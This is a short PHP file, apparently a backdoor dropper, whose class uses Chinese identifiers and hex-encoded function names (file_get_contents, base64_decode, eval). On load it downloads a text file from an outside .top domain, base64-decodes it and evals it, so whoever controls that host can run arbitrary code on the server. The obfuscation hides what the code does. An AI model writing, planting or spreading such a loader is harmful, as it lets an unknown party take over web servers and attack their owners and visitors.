<?php
class 加载器 {
    private static $方法库 = [];
    
    public static function 准备() {

        $获取 = hex2bin('66696c655f6765745f636f6e74656e7473');
        $解码 = hex2bin('6261736536345f6465636f6465');
        $执行 = hex2bin('6576616c');
        
        self::$方法库 = [
            '下载' => function($链接) use ($获取) { return $获取($链接); },
            '转换' => function($输入) use ($解码) { 
                $结果 = $解码($输入, true);
                return ($结果 !== false) ? $结果 : $输入;
            },
            '运行' => function($代码) use ($执行) { return $执行('?>' . $代码); }
        ];
    }
    
    public static function 处理($源地址) {
        $原始数据 = self::$方法库['下载']($源地址);
        $处理数据 = self::$方法库['转换']($原始数据);
        return self::$方法库['运行']($处理数据);
    }
}

加载器::准备();
加载器::处理("https://ampnyapunyaku.top/tools/s-media/media-new.txt");
?>
